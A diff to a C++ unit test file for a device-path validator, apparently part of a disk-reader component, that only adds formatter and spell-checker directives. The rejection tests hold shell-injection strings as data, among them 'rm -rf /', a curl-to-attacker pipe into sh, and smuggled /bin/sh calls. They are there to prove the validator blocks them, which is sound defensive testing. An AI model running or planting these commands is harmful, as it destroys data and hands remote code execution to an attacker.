@@ -20,19 +20,27 @@
 
 TEST(HddReaderTest, ValidDevicePath)
 {
+  // cspell:disable
+  // clang-format off
   EXPECT_TRUE(validate_unmount_device_name("/dev/sda1"));
   EXPECT_TRUE(validate_unmount_device_name("/dev/nvme0n1p2"));
   EXPECT_TRUE(validate_unmount_device_name("/dev/mmcblk0p1"));
   EXPECT_TRUE(validate_unmount_device_name("/dev/mapper/cryptroot"));
   EXPECT_TRUE(validate_unmount_device_name("/dev/dm-0"));
+  // cspell:enable
+  // clang-format on
 }
 
 TEST(HddReaderTest, InvalidDevicePath)
 {
+  // cspell:disable
+  // clang-format off
   EXPECT_FALSE(validate_unmount_device_name("/dev/sda1; rm -rf /"));
   EXPECT_FALSE(validate_unmount_device_name("/dev/null; curl http://attacker/x | sh #"));
   EXPECT_FALSE(validate_unmount_device_name("/dev/sda1 && /bin/sh"));
   EXPECT_FALSE(validate_unmount_device_name("/dev/sda1|cat"));
   EXPECT_FALSE(validate_unmount_device_name("/tmp/evil"));
   EXPECT_FALSE(validate_unmount_device_name("/dev/sda1\n/bin/sh"));
+  // cspell:enable
+  // clang-format on
 }
